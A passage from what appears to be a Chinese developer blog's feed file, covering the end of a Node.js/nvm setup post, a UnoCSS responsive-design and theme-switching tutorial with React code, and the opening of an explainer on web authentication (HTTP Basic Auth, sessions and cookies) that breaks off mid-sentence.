class="keyword">const</span> hostname = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="property">statusCode</span> = <span class="number">200</span>;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;hello, Node.js!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(port, hostname, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at http://<span class="subst">$&#123;hostname&#125;</span>:<span class="subst">$&#123;port&#125;</span>/`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用以下指令运行上面这个 web 应用，然后在浏览器中访问 <a href="http://127.0.0.1:3000/">http://127.0.0.1:3000</a> 即可看到页面中的 <code>hello, Node.js!</code> 字符串。</p><p>然后，开始你的 Node.js 学习之旅吧！</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>想再说说 DNS 污染。</p><p>简单地说，DNS 污染就是域名服务器返回了错误的 IP 地址，导致无法请求到目标资源。导致 DNS 污染的操作有很多，可能是服务器本身的缺陷、开发者的错误设置，也有可能是他人造成的恶意攻击，不晓得本篇中 <a href="https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh">nvm 安装程序</a> 的 DNS 污染是出于什么原因。</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
            <tag> nvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于UnoCSS实现响应式设计&amp;颜色主题</title>
      <link href="/2023/09/17/2023/unocss-theme/"/>
      <url>/2023/09/17/2023/unocss-theme/</url>
      
        <content type="html"><![CDATA[<p>UnoCSS 是一个 🔥火热的原子级 CSS 引擎。具体介绍不多说，本篇文章主题是实践，概念性的知识请去其官方网站了解：<a href="https://alfred-skyblue.github.io/unocss-docs-cn/">UnoCSS 中文文档</a>。</p><p>此外，本篇文章撸出来的小页面在线展示链接如下，对最终效果感兴趣的话可以看看：<a href="http://example.ma5hr00m.top/">Online Demo</a>。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>使用 React&amp;UnoCSS 的组合。先撸个简单的 Demo 页面，用于展示本篇的主题：<br>​<br><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20230926170511.png" alt="Demo页面"></p><p>实际上就是一个简单的信息卡片，卡片底部是一个用于切换颜色主题的复选框。</p><h2 id="响应式设计"><a href="#响应式设计" class="headerlink" title="响应式设计"></a>响应式设计</h2><h3 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h3><p>在 Web 发展的洪荒年代，大家搭建的网页多是使用固定布局，如果用户使用的屏幕尺寸与设计者考虑的屏幕尺寸不同，就会出现多余的滚动条或者多余的页面空白，严重降低了用户体验😵‍💫。</p><p>如果你想感受一下早期的 Web 前端页面，可以看看这个<a href="https://nic.eu.org/">👉历史悠久的网站</a>，并尝试分别使用不同设备访问它（或者使用 DevTools 自带的工具）。</p><blockquote><p>这个网站本身也比较有趣，以后我可能会讲讲它。</p></blockquote><p>随着科技的发展，人们使用的屏幕尺寸越来越多，逐渐出现了响应式网页设计的概念（<em>responsive web design，RWD</em>）。<em>RWD</em> 是一种让网页能够根据不同的设备和屏幕尺寸自动适应的设计方法。它可以让网页在手机、电脑等设不同备上保持良好的布局。你现在能看到的大多数网站都使用了响应式设计，最常见的就是顶部导航栏的标签：</p><blockquote><p>在此页面打开 Devtools，改变页面尺寸，看看会发生什么！<br>​</p></blockquote><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><p>在正式开始之前，有一些常见概念需要你了解🧐：</p><ul><li><em>视口 viewport</em><br>视口是浏览器窗口中显示网页内容的区域。不同的设备有不同的视口大小，你可以使用meta标签来设置视口的宽度和缩放比例。</li><li><em>媒体查询 media query</em><br>媒体查询是一种CSS技术，可以让你根据不同的媒体类型和特征（如屏幕宽度、高度、分辨率等）来应用不同的样式规则。</li><li><em>流式布局 fluid layout</em><br>流式布局是一种使用百分比或相对单位（如em、rem、vw、vh等）来定义网页元素宽度和高度的布局方法。它可以让网页元素随着视口大小的变化而自动调整。</li><li><em>断点 breakpoint</em><br>断点是指在不同的视口大小下，网页布局发生变化的临界点。你可以使用媒体查询来定义不同的断点，并在每个断点下应用不同的样式规则。</li><li><em>弹性盒子 flexbox</em><br>弹性盒子是一种CSS布局模块，可以让你轻松地对齐和分配网页元素。它可以让你在水平或垂直方向上创建弹性的网格系统，并根据视口大小自动调整元素的大小和顺序。</li><li><em>网格 grid</em><br>网格是另一种CSS布局模块，可以让你创建复杂的二维网格系统，并在每个网格单元中放置网页元素。它可以让你定义不同的行和列，并根据视口大小自动调整它们的大小和位置。</li></ul><h2 id="颜色主题"><a href="#颜色主题" class="headerlink" title="颜色主题"></a>颜色主题</h2><p>这个无需多言，很多网站都已经配置了亮色主题和暗色主题，用户可以自行选择。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="响应式设计-1"><a href="#响应式设计-1" class="headerlink" title="响应式设计"></a>响应式设计</h3><p><code>UnoCSS</code> 基本兼容了 <code>Tailwind CSS</code> 的语法，我们可以使用类似的方法使用断点，编写在不同尺寸下的组件样式。</p><p>首先，我们可以在配置文件中手动设置不同层级的断点。当然，你也可以使用默认值，我这里稍微做了些修改，添加了 <code>xxs</code>、<code>xxl</code> 断点：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// uno.config.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="attr">theme</span>: &#123;</span><br><span class="line">        <span class="attr">breakpoints</span>: &#123;</span><br><span class="line">            <span class="attr">xxs</span>: <span class="string">&#x27;0px&#x27;</span>,</span><br><span class="line">            <span class="attr">xs</span>: <span class="string">&#x27;320px&#x27;</span>,</span><br><span class="line">            <span class="attr">sm</span>: <span class="string">&#x27;480px&#x27;</span>,</span><br><span class="line">            <span class="attr">md</span>: <span class="string">&#x27;768px&#x27;</span>,</span><br><span class="line">            <span class="attr">lg</span>: <span class="string">&#x27;1024px&#x27;</span>,</span><br><span class="line">            <span class="attr">xl</span>: <span class="string">&#x27;1280px&#x27;</span>,</span><br><span class="line">            <span class="attr">xxl</span>: <span class="string">&#x27;1600px&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    ... ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>按照如上代码进行配置后，我们可以在 React 的 <code>.jsx</code> 文件中通过 <code>md:</code> 语法设置不同断点下的样式：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div className=&#123;<span class="string">`shadow card-base text-base flex flex-col p-10 md:w-fit md:h-fit xxs:box-border xxs:items-center xxs:justify-center xxs:w-full xxs:h-full`</span>&#125;&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">className</span>=<span class="string">&quot;text-lg font-bold m-0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        Responsive Design &amp; Theme</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">className</span>=<span class="string">&quot;mb-4 text-center&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        Change window size or click the following button.</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#x27;h-30px w-full flex items-center justify-center&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">SwitchButton</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">height</span>=<span class="string">&#x27;50px&#x27;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">width</span>=<span class="string">&#x27;60px&#x27;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">layout</span>=<span class="string">&#x27;translate-x-[-50%]&#x27;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">isChecked</span>=<span class="string">&#123;isChecked&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">SwitchFunction</span>=<span class="string">&#123;handleSwitch&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>正如本篇文章开头展示的图片，这段代码实现了一个简单的信息卡片。当页面宽度不小于 <code>768px</code> 时，卡片为固定尺寸，可以显示背景背景；当页面宽度小于 <code>768px</code> 时，这个卡片会占满全屏，遮挡住页面背景。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20230926171533.png" alt="对比展示"></p><h3 id="主题切换"><a href="#主题切换" class="headerlink" title="主题切换"></a>主题切换</h3><p>在展示页面中，我只做了亮暗色主题。</p><p>如果你想要在 UnoCSS 中使用亮暗色主题，需要在配置文件中进行设置。我使用的方法参考了该框架作者 <code>Anthony Fu</code> 的一条推文。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20230926171653.png" alt="展示"></p><p>该条推文至今已有一年时间，或许已经出现了更加优秀的主题切换方案。<br>​<br>首先，我们需要在配置文件中进行配置，设置 <code>shortcuts</code> 并设置了亮暗色主题的不同颜色。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">    ... ...</span><br><span class="line">    <span class="attr">shortcuts</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;switch-animation&#x27;</span>: <span class="string">&#x27;transition duration-300&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;bg-base&#x27;</span>: <span class="string">&#x27;bg-[#f0f0f0] dark:bg-[#20202a] switch-animation&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;card-base&#x27;</span>: <span class="string">&#x27;bg-[#ffffff] dark:bg-[#10101a] switch-animation&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;text-base&#x27;</span>: <span class="string">&#x27;text-[#20202a] dark:text-[#f0f0f0] switch-animation&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;switch-label-base&#x27;</span>: <span class="string">&#x27;bg-gray-200 dark:bg-gray-800 switch-animation&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;switch-span-base&#x27;</span>: <span class="string">&#x27;bg-white dark:bg-gray-300 switch-animation&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    ... ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后，我们编写一个 <code>SwitchButton.jsx</code> 组件，用于切换主题状态。为了使这个状态能够应用到主页面，我们将这个 <code>theme</code> 状态提升到其父组件中，并将其值绑定到相对底层的 div 元素中，以控制颜色主题。具体代码实现如下：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SwitchButton/index.jsx</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">PropTypes</span> <span class="keyword">from</span> <span class="string">&#x27;prop-types&#x27;</span>;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SwitchButton</span>(<span class="params">&#123; height, width, layout, theme, SwitchFunction &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">handleSwitch</span> = (<span class="params">event</span>) =&gt; &#123;</span><br><span class="line">        <span class="title class_">SwitchFunction</span>(event.<span class="property">target</span>.<span class="property">checked</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;</span>`<span class="attr">relative</span> <span class="attr">h-</span>[$&#123;<span class="attr">height</span>&#125;] <span class="attr">w-</span>[$&#123;<span class="attr">width</span>&#125;] <span class="attr">flex</span> <span class="attr">items-center</span> <span class="attr">justify-center</span> $&#123;<span class="attr">layout</span>&#125;`&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                <span class="attr">id</span>=<span class="string">&quot;dark-light&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                <span class="attr">className</span>=<span class="string">&quot;absolute z-1 w-12 h-5&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                <span class="attr">onChange</span>=<span class="string">&#123;handleSwitch&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            /&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">label</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                <span class="attr">htmlFor</span>=<span class="string">&quot;dark-light&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                <span class="attr">className</span>=<span class="string">&#x27;absolute z-2 block w-11 h-6 switch-label-base rounded-full shadow-inner cursor-pointer switch-animation hover:cursor-pointer&#x27;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            &gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">span</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">className</span>=<span class="string">&#123;</span>`<span class="attr">absolute</span> <span class="attr">top-1</span> <span class="attr">left-1.5</span> <span class="attr">w-4</span> <span class="attr">h-4</span> <span class="attr">switch-span-base</span> <span class="attr">rounded-full</span> <span class="attr">shadow-md</span> <span class="attr">switch-animation</span> $&#123;<span class="attr">theme</span>==<span class="string">&#x27;dark&#x27;</span> ? &#x27;<span class="attr">translate-x-</span>[<span class="attr">100</span>%]&#x27; <span class="attr">:</span> &#x27;&#x27;&#125;`&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                &gt;</span>   </span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="title class_">SwitchButton</span>.<span class="property">propTypes</span> = &#123;</span><br><span class="line">    <span class="attr">height</span>: <span class="title class_">PropTypes</span>.<span class="property">string</span>.<span class="property">isRequired</span>,</span><br><span class="line">    <span class="attr">width</span>: <span class="title class_">PropTypes</span>.<span class="property">string</span>.<span class="property">isRequired</span>,</span><br><span class="line">    <span class="attr">layout</span>: <span class="title class_">PropTypes</span>.<span class="property">string</span>.<span class="property">isRequired</span>,</span><br><span class="line">    <span class="attr">theme</span>: <span class="title class_">PropTypes</span>.<span class="property">string</span>.<span class="property">isRequired</span>,</span><br><span class="line">    <span class="title class_">SwitchFunction</span>: <span class="title class_">PropTypes</span>.<span class="property">func</span>.<span class="property">isRequired</span>,</span><br><span class="line">&#125;;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">SwitchButton</span>;</span><br></pre></td></tr></table></figure><br/><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// App.jsx</span></span><br><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">SwitchButton</span> <span class="keyword">from</span> <span class="string">&#x27;./SwitchButton/index&#x27;</span>;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [theme, setTheme] = <span class="title function_">useState</span>(<span class="string">&#x27;dark&#x27;</span>);</span><br><span class="line">​</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleSwitch</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">setTheme</span>(<span class="function">(<span class="params">prevChecked</span>) =&gt;</span> (prevChecked === <span class="string">&#x27;dark&#x27;</span> ? <span class="string">&#x27;light&#x27;</span> : <span class="string">&#x27;dark&#x27;</span>));</span><br><span class="line">  &#125;;</span><br><span class="line">​</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;</span>`<span class="attr">w-100vw</span> <span class="attr">h-100vh</span> <span class="attr">flex</span> <span class="attr">flex-col</span> $&#123;<span class="attr">theme</span>&#125;`&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">main</span> <span class="attr">className</span>=<span class="string">&quot;w-100vw flex-1 flex justify-center items-center bg-base&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;</span>` <span class="attr">shadow</span> <span class="attr">card-base</span> <span class="attr">text-base</span> <span class="attr">flex</span> <span class="attr">flex-col</span> <span class="attr">p-10</span>  <span class="attr">md:w-fit</span> <span class="attr">md:h-fit</span> <span class="attr">xxs:box-border</span> <span class="attr">xxs:items-center</span> <span class="attr">xxs:justify-center</span> <span class="attr">xxs:w-full</span> <span class="attr">xxs:h-full</span>`&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">h2</span> <span class="attr">className</span>=<span class="string">&quot;text-lg font-bold m-0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            Responsive Design &amp; Theme</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">className</span>=<span class="string">&quot;mb-4 text-center&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            Change window size or click the following button.</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#x27;h-30px w-full flex items-center justify-center&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">SwitchButton</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">height</span>=<span class="string">&#x27;50px&#x27;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">width</span>=<span class="string">&#x27;60px&#x27;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">layout</span>=<span class="string">&#x27;translate-x-[-50%]&#x27;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">theme</span>=<span class="string">&#123;theme&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">SwitchFunction</span>=<span class="string">&#123;handleSwitch&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            /&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><p>至此，我们的颜色主题切换效果也已经实现了，具体效果请移步 <code>demo</code> 网站查看：<a href="http://example.ma5hr00m.top/">demo</a></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>写这个 demo 的时候其实还不会用状态管理库，所以选择了状态提升，现在看起来很捞。</p><p>跨组件传参的话，建议直接使用状态管理库，比如 <code>jotai</code>.</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frontend </tag>
            
            <tag> UnoCSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见Web鉴权方案</title>
      <link href="/2023/09/17/2023/web-usual-auth/"/>
      <url>/2023/09/17/2023/web-usual-auth/</url>
      
        <content type="html"><![CDATA[<h2 id="鉴权-持久化登陆"><a href="#鉴权-持久化登陆" class="headerlink" title="鉴权 &amp; 持久化登陆"></a>鉴权 &amp; 持久化登陆</h2><h3 id="鉴权"><a href="#鉴权" class="headerlink" title="鉴权"></a>鉴权</h3><p><strong>鉴权</strong>（<em>Authentication</em>）是指确认用户身份的过程。<br>在计算机系统中，鉴权是一种安全机制，用于验证用户是否具有访问系统资源的权限。通过鉴权机制，系统可以验证用户提供的凭据（如用户名和密码、数字证书等），并决定是否授予用户所请求的访问权限。</p><p>传统的鉴权是通过密码来实现的。这种方式的前提是，每个获得密码的用户都已经被授权。在建立用户时，就为此用户分配一个密码，用户的密码可以由管理员指定，也可以由用户自行申请。</p><h3 id="持久化登陆"><a href="#持久化登陆" class="headerlink" title="持久化登陆"></a>持久化登陆</h3><p><strong>持久化登录</strong>（<em>Persistent Login</em>）是一种使用户在多次会话之间保持登录状态的机制。<br>一般情况下，每个 HTTP 请求都是独立的，服务器不会保存关于客户端的信息，因此服务器无法识两个连续请求是否来自相同用户。这被称为 <strong>HTTP 协议的无状态性</strong>。</p><p>无状态性对于 Web 的可伸缩性和简单性至关重要。服务器不需要维护大量的客户端状态信息，这允许服务器更轻松地处理大量并发请求</p><p>为了解决无状态性带来的问题，持久化登录机制应运而生。通常情况下，用户在登录后，系统会为其分配一个会话标识，并将该标识存储在客户端。这样，在用户下次访问网站时，系统可以通过检查客户端中的会话标识来自动识别用户，若验证成功，则将其视为已登录状态，而无需用户再次输入用户名和密码。</p><h2 id="HTTP-Basic-Authentication"><a href="#HTTP-Basic-Authentication" class="headerlink" title="HTTP Basic Authentication"></a>HTTP Basic Authentication</h2><p>HTTP 提供一个用于权限控制和认证的通用框架，<code>HTTP Basic Authentication</code> 是最常用的由 HTTP 协议定义的认证方式。</p><p>常见的 <em>Basic HTTP 认证</em> 实现流程如下：</p><ol><li>当客户端请求一个需要认证的资源时，服务器会返回一个 401 状态码，并在响应头中添加一个 WWW-Authenticate 字段，指明认证的方式（<em>Basic</em>）和安全域（<em>realm</em>）。</li><li>客户端收到 401 响应后，会弹出一个对话框，让用户输入用户名和密码。用户输入对应内容，然后客户端会将用户名和密码用冒号连接，使用 Base64 编码，再加上 Basic 前缀，作为 Authorization 字段的值，发送给服务器。</li><li>服务器收到 Authorization 字段后，会解码得到用户名和密码，然后进行验证。如果验证通过，服务器会返回请求的资源。如果验证失败，服务器会再次返回 401 响应。</li></ol><p>除此之外，还有 Bearer、Digest 等 HTTP 认证方案。如果你感兴趣，请移步此网址进行查看：<a href="http://www.iana.org/assignments/http-authschemes/http-authschemes.xhtml">Hypertext Transfer Protocol (HTTP) Authentication Scheme Registry</a>。</p><p>如果你想给自己的网站添加鉴权功能，同时又不想编写一套前后端鉴权系统，可以尝试 <code>HTTP Basic Authentication</code>，它足以提供基本的鉴权功能，并且足够简单，简单到你只需要在 Nginx 中进行几句配置。</p><p>使用 Nginx 为你的网站添加 HTTP 身份认证，可以参考这篇文章：[Nginx Http基本身份认证](<code>HTTP Basic Authentication</code> 足以提供一个基本的鉴权功能，简单易用，)。</p><p>于此同时，<code>HTTP Basic Authentication</code> 的缺点也很明显：用户名和密码都是明文传输，容易被窃听或者重放，一般需要配合 HTTPS 来保证传输的安全性；不支持注销操作，只能关闭浏览器清除认证信息；只能为网站提供保护，很难实现私有路由；只能使用浏览器自带的提示框，不能自定义登陆页面……</p><h2 id="session-cookie"><a href="#session-cookie" class="headerlink" title="session-cookie"></a>session-cookie</h2><p>可以使用 session-cookie 实现前后端的鉴权认证。</p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p><code>Cookie</code>（<em>HTTP Cookie</em>）是一些 <strong>字符串数据</strong>，存储在客户端。</p><p>服务器可以通过 HTTP 响应头将一个或多个 cookie 发送给客户端，客户端的浏览器会将这些 cookie 存储在本地。每次客户端向服务器发送请求时，浏览器会自动将与请求相关的 cookie 附加到请求头中发送给服务器。</p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p><code>Session</code>（<em>会话</em>）是服务器为了保存用户状态而创建的一个特殊的 <strong>对象</strong>。</p><p>当浏览器第一次访问服务器时，服务器创建一个 session 对象 (该对象有一个唯一的 id ,一般称之为 <code>SessionId</code>)，服务器会将 SessionId 以 cookie 的方式发送给浏览器。当浏览器再次访问服务器时，会将 SessionId发送过来，服务器依据 SessionId 就可以找到对应的 session 对象，并对用户身份进行验证。</p><h3 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h3><ol><li>用户首次访问网站，服务器会创建一个 Session，并生成一个与之对应的 sid，创建的 Session 一般保存在服务器 <em>内存</em> 、<em>数据库</em> 或者 <em>redis</em> 中，通常是 redis；</li><li>服务器将 sid 填入 Cookie 中，然后将 Cookie 发送给客户端，客户端在接受到 Cookie 后将其保存在本地，通常存在 localStorage 或者 localCookie 中；</li><li>客户端在后续的请求中会携带这个 Cookie，服务器通过 Cookie 中的 sid 找到对应的 Session，从而识别用户状态，判断请求是否合法；</li><li>当用户退出登录或者 Session 过期后，服务器会销毁对应的 Session。</li></ol><p>你也可以参考下面这张图，更方便理解：</p><p><img src="http://img.ma5hr00m.top//img/20230926223807.png" alt="session实现流程"></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>session 和 cookie 